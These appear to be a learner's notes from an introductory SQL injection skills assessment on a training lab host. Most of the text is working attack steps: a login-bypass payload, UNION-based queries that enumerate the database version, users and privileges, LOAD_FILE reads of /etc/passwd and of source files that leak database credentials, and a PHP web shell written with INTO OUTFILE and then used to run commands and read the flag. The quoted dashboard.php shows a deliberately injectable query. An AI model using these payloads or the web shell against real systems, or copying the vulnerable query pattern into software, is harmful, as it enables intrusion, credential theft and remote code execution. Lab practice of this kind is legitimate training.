intro to SQL injection skills assessment

Got a successful login with the payload

admin' or '1'='1'#
admin’ or ‘1’=‘1’— 


#doing ordering by
' ORDER BY 2,3,4,5-- 

cn' UNION select 1,2,@@version,3,4-- 
#^ Works?

cn' UNION select 1,@@version,2,3,4#

#user privs
cn' UNION select 1,user(),2,3,4#
works


cn' UNION SELECT 1, super_priv, 2, 3, 4 FROM mysql.user#
#works

cn' UNION SELECT 1, grantee, privilege_type, 3, 4 FROM information_schema.user_privileges#
#works


cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 2, 3, 4#
#works


#Reading dashboard.php
#we know the website is running on apache

cn' UNION SELECT 1, LOAD_FILE("/var/www/html/dashboard/dashboard.php"), 2, 3, 4#
#works

# it is reading in a ../config.php
# php code of dashboard.php:
-- <!--?php
--         session_start();
--         if($_SESSION['login'] !== 1) {
--           header("Location: index.php");
--           die();
--         }
-- 	      include "../config.php";

--         if(isset($_POST['search'])) {

--           $q = "Select * from payment where month like '%". $_POST["search"] ."%'";

--           $result = mysqli_query($conn, $q);

--           if (!$result)
--           {
--                  die(mysqli_error($conn));
--           }
--           while($row = mysqli_fetch_array($result, MYSQLI_BOTH))
--               {
--                 echo "


cn' UNION SELECT 1, LOAD_FILE("/var/www/html/config.php"), 2, 3, 4#
#works, gives:
'127.0.0.1', 'DB_USERNAME' => 'root', 'DB_PASSWORD' => 'password', 'DB_DATABASE' => 'ilfreight' ); $conn = mysqli_connect($config['DB_HOST'], $config['DB_USERNAME'], $config['DB_PASSWORD'], $config['DB_DATABASE']); if (mysqli_connect_errno($conn)) { echo "Failed connecting. " . mysqli_connect_error() . "
"; } ?>

# authenticating via mariadb , password is password
mysql -u root -h 178.128.37.153:31557 -P 3306 -p # Doesnt work, unknown mysql server host


# is ok, let's write a shell file 
cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/shell.php'#
# permission denied, let's try in the dashoard repo

cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "", "" into outfile '/var/www/html/dashboard/shell.php'#
# blank, guessing success


http://178.128.37.153:31557/dashboard/shell.php?0=whoami
-> www-data

http://178.128.37.153:31557/dashboard/shell.php?0=ls
-> http://178.128.37.153:31557/dashboard/shell.php?0=whoami

http://178.128.37.153:31557/dashboard/shell.php?0=ls%20/
-> bin boot dev etc flag_cae1dadcd174.txt home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var


http://178.128.37.153:31557/dashboard/shell.php?0=cat%20/flag_cae1dadcd174.txt
-> 528d6d9cedc2c7aab146ef226e918396

